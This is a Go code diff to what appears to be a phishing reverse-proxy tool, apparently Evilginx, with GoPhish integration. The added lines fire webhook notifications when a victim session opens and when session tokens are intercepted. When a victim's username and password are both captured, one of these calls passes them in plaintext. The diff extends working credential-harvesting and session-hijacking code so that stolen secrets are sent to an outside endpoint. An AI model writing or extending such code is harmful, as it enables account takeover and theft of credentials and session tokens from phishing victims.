@@ -422,6 +422,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
 									session.RedirectURL = pl.RedirectUrl
+
+									// Send webhook notification for new session
+									p.webhook.NotifySessionCreated(pl.Name, session.Id, remote_addr, req.Header.Get("User-Agent"))
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
 									}
@@ -1063,6 +1066,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
+						// Send webhook notifications for tokens captured and session complete
+						tokenCount := len(s.CookieTokens) + len(s.BodyTokens) + len(s.HttpTokens)
+						p.webhook.NotifyTokensCaptured(s.Name, ps.SessionId, tokenCount)
+						p.webhook.NotifySessionComplete(s.Name, ps.SessionId, s.Username, tokenCount > 0)
+
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -1201,6 +1209,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+
+								// Send webhook notifications for tokens captured and session complete
+								tokenCount := len(s.CookieTokens) + len(s.BodyTokens) + len(s.HttpTokens)
+								p.webhook.NotifyTokensCaptured(s.Name, ps.SessionId, tokenCount)
+								p.webhook.NotifySessionComplete(s.Name, ps.SessionId, s.Username, tokenCount > 0)
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1581,6 +1594,10 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetUsername(username)
+		// Send webhook notification when both username and password are captured
+		if s.Username != "" && s.Password != "" {
+			p.webhook.NotifyCredentialCaptured(s.Name, sid, s.Username, s.Password)
+		}
 	}
 }
 
@@ -1591,6 +1608,10 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+		// Send webhook notification when both username and password are captured
+		if s.Username != "" && s.Password != "" {
+			p.webhook.NotifyCredentialCaptured(s.Name, sid, s.Username, s.Password)
+		}
 	}
 }
 
